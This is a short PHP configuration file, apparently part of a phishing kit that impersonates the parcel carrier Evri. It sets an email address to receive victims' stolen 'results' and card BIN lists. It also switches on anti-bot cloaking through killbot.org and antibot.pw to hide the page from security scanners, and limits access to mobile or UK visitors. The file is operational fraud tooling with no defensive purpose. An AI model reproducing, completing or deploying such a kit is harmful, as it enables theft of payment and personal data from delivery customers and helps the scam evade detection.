<?php
error_reporting(0);
// @Kr3pto on telegram
$to = "ccheych@yahoo.com"; // your results email here
$saveonhost = 0; // save a copy of results on host // 1 for enable and 0 for disable
 
$save_binz = 0; // save binlist on host // 1 for enable and 0 for disable

$ExitLink = "https://www.evri.com/";


// some blockers
$internal_antibot = 1;

$One_Time_Access = 0; //1 for enable and 0 for disable


$enable_killbot = 0; // this one uses killbot.org blocker // 1 to enable and 0 to disable
$killbot_key = ''; // external blocker api key u get from here after u topup your balance https://killbot.org/developer [ required if killbot.org is enabled ]

$external_antibot = 0; // this one uses antibot.pw blocker // 1 to enable and 0 to disable
$apikey = ''; // external blocker api key u get from here after u topup your balance https://antibot.pw/dashboard/developers [ required if antibot.pw is enabled ]

$mobile_lock = 1; // 1 to enable and 0 to disable
$UK_lock = 0;  //1 for enable and 0 for disable

$ask_sort_acc = 1;

?>